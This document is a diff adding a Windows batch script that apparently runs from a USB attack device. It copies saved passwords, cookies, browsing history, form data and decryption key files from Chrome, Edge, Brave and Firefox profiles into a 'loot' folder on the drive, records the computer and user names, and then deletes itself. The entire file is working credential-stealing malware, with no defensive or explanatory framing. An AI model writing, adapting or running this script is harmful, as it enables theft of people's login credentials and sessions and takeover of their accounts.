@@ -1,0 +1,48 @@
+@echo off
+for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist %%d:\inject.bin set U=%%d:
+if not defined U exit /b
+set "L=%U%\loot\%COMPUTERNAME%-%USERNAME%"
+
+set "S=%LOCALAPPDATA%\Google\Chrome\User Data"
+if exist "%S%" (
+    mkdir "%L%\Chrome\Default" 2>nul
+    copy "%S%\Local State" "%L%\Chrome\" /y >nul 2>nul
+    for %%f in ("Login Data" "Login Data For Account" "Cookies" "History" "Bookmarks" "Web Data") do @copy "%S%\Default\%%~f" "%L%\Chrome\Default\" /y >nul 2>nul
+    for /d %%p in ("%S%\Profile *") do (
+        mkdir "%L%\Chrome\%%~nxp" 2>nul
+        for %%f in ("Login Data" "Login Data For Account" "Cookies" "History" "Bookmarks" "Web Data") do @copy "%%p\%%~f" "%L%\Chrome\%%~nxp\" /y >nul 2>nul
+    )
+)
+
+set "S=%LOCALAPPDATA%\Microsoft\Edge\User Data"
+if exist "%S%" (
+    mkdir "%L%\Edge\Default" 2>nul
+    copy "%S%\Local State" "%L%\Edge\" /y >nul 2>nul
+    for %%f in ("Login Data" "Login Data For Account" "Cookies" "History" "Bookmarks" "Web Data") do @copy "%S%\Default\%%~f" "%L%\Edge\Default\" /y >nul 2>nul
+    for /d %%p in ("%S%\Profile *") do (
+        mkdir "%L%\Edge\%%~nxp" 2>nul
+        for %%f in ("Login Data" "Login Data For Account" "Cookies" "History" "Bookmarks" "Web Data") do @copy "%%p\%%~f" "%L%\Edge\%%~nxp\" /y >nul 2>nul
+    )
+)
+
+set "S=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"
+if exist "%S%" (
+    mkdir "%L%\Brave\Default" 2>nul
+    copy "%S%\Local State" "%L%\Brave\" /y >nul 2>nul
+    for %%f in ("Login Data" "Login Data For Account" "Cookies" "History" "Bookmarks" "Web Data") do @copy "%S%\Default\%%~f" "%L%\Brave\Default\" /y >nul 2>nul
+    for /d %%p in ("%S%\Profile *") do (
+        mkdir "%L%\Brave\%%~nxp" 2>nul
+        for %%f in ("Login Data" "Login Data For Account" "Cookies" "History" "Bookmarks" "Web Data") do @copy "%%p\%%~f" "%L%\Brave\%%~nxp\" /y >nul 2>nul
+    )
+)
+
+set "F=%APPDATA%\Mozilla\Firefox\Profiles"
+if exist "%F%" (
+    for /d %%p in ("%F%\*") do (
+        mkdir "%L%\Firefox\%%~nxp" 2>nul
+        for %%f in ("logins.json" "key4.db" "cookies.sqlite" "places.sqlite" "cert9.db" "formhistory.sqlite") do @copy "%%p\%%~f" "%L%\Firefox\%%~nxp\" /y >nul 2>nul
+    )
+)
+
+>"%L%\sysinfo.txt" echo %COMPUTERNAME% / %USERNAME% / %USERDOMAIN% / %DATE% %TIME%
+del "%~f0"
